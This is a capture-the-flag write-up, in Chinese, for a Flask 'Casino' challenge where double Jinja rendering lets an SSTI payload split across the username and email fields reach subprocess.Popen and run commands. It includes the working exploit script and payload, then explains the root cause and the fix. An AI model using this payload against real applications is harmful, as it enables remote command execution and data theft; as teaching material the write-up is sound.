# Casino

## 题目简述

Casino 允许用户注册、登录、游玩老虎机并导出账户 CSV。导出功能先用 Jinja 渲染 CSV 模板，再把生成结果交给 `render_template_string()` 做第二次渲染。虽然注册字段经过简单过滤，但用户名和邮箱分别过滤，可以把一条 SSTI 表达式拆到两个字段中，在第二次渲染时重新拼合并执行命令。

## 解题过程

### 审计双重模板渲染

CSV 模板为：

```jinja2
USERNAME,{{ username }}
MAIL,{{ email }}
INSCRIPTION DATE,{{ created_at }}
MONEY,{{ money }}
STATS,{{ stats }}
```

导出路由的关键代码是：

```python
template = open("template.csv", "r").read()
csv = jinja2.Template(template).render(
    username=sanitize(current_user.username),
    email=sanitize(current_user.email),
    created_at=current_user.created_at.strftime("%Y-%m-%d %H:%M:%S"),
    money=current_user.money,
    stats=json.dumps(current_user.stats),
)
response = make_response(render_template_string(csv))
```

第一次渲染本来已经足以生成 CSV，第二次 `render_template_string(csv)` 却会把用户字段中残留的 Jinja 语法再次解释。

过滤器会拦截同一个字段中同时出现的 `{` 与 `}`，以及 `{%`、`%}`、`<`、`>`、`os`、`union` 和 `select`。它没有在所有字段拼接后再次检查，因此可以这样拆分：

```text
username = 随机前缀 + {{ """
email    = """.后续表达式}}
```

第一次渲染后，两段之间夹着的 CSV 文本被三引号变成一个普通字符串；到第二次渲染时，它们已经组成完整的 `{{ ... }}`。

### 从 Python 对象图取得命令执行

空字符串的 MRO 可以到达 `object`，再通过 `object.__subclasses__()` 找到 `subprocess.Popen`：

```jinja2
""".__class__.mro()[1].__subclasses__()[INDEX]
```

`INDEX` 与 Python 版本和已加载模块有关。比赛容器中的参考索引为 `528`，另一份官方分析环境中为 `524`；复现时若索引不同，可以先让模板输出 `object.__subclasses__()`，在导出的列表中定位 `subprocess.Popen` 后再替换索引。

以下脚本完成注册、登录和导出。`prefix` 保证每次注册的用户名唯一：

```python
import secrets

import requests


BASE_URL = "http://target/"
POPEN_INDEX = 528
COMMAND = "cat .passwd"

session = requests.Session()
prefix = secrets.token_hex(16)
username = prefix + '{{ """'
email = (
    '""".__class__.mro()[1].__subclasses__()'
    f'[{POPEN_INDEX}]({COMMAND!r},shell=True,stdout=-1)'
    '.communicate()[0].decode().strip()}}'
)

session.post(
    BASE_URL + "register",
    data={
        "username": username,
        "email": email,
        "password": "test",
    },
)
session.post(
    BASE_URL + "login",
    data={
        "username": username,
        "password": "test",
    },
)

response = session.get(BASE_URL + "export")
print(response.text)
```

Dockerfile 将 `flag.txt` 复制为应用工作目录下的 `.passwd`，因此命令输出会出现在导出的 CSV 中：

```text
N0PS{s5T1_4veRywh3R3!!}
```

## 方法总结

漏洞根因是把已经渲染完成、且混入用户数据的文本再次当作模板执行。逐字段过滤无法感知用户名中的起始定界符与邮箱中的结束定界符会在后续阶段拼成完整表达式。修复时应删除第二次模板渲染，让用户数据只作为数据写入 CSV；如果确需模板，应使用固定模板、开启合适的转义和沙箱，并禁止用户内容进入模板源码。
